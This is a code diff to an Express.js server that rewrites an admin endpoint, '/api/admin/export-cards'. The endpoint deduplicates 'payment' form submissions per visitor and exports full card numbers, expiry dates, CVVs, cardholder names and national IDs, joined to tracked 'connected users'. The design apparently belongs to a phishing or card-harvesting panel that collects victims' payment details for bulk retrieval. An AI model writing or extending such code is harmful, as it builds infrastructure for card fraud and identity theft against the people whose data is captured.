@@ -344,8 +344,37 @@ app.get('/api/admin/search-forms', authMiddleware, (req, res) => {
 });
 
 app.get('/api/admin/export-cards', authMiddleware, (req, res) => {
-  const cards = db.formSubmissions.filter(f => f.formType === 'payment');
-  res.json(cards);
+   const paymentSubs = db.formSubmissions.filter(f => f.formType === 'payment');
+  const userMap = {};
+  paymentSubs.forEach(sub => {
+    const uuid = sub.uuid || sub.userId;
+    if (!uuid) return;
+    if (!userMap[uuid] || new Date(sub.timestamp) > new Date(userMap[uuid].timestamp)) {
+      userMap[uuid] = sub;
+    }
+  });
+  const cards = Object.values(userMap).map(sub => {
+    const user = db.connectedUsers.find(u => u.visitorId === sub.uuid) || {};
+    const formData = sub.formData || {};
+    return {
+      name: user.userInfo?.name || formData.cardholderName || 'Unknown',
+      nationalId: user.userInfo?.nationalId || '',
+      uuid: sub.uuid || sub.userId || '',
+      payment: {
+        bankName: formData.bankName || '',
+        cardNumber: formData.cardNumber || '',
+        cardholderName: formData.cardholderName || '',
+        expiryMonth: formData.expiryMonth || '',
+        expiryYear: formData.expiryYear || '',
+        cvv: formData.cvv || '',
+        brandType: formData.brandType || formData.cardType || '',
+        level: formData.level || formData.cardLevel || '',
+        amount: formData.amount || '',
+        currency: formData.currency || 'USD'
+      }
+    };
+  });
+  res.json({ cards });
 });
 
 app.get('/api/admin/export-data-csv', authMiddleware, (req, res) => {
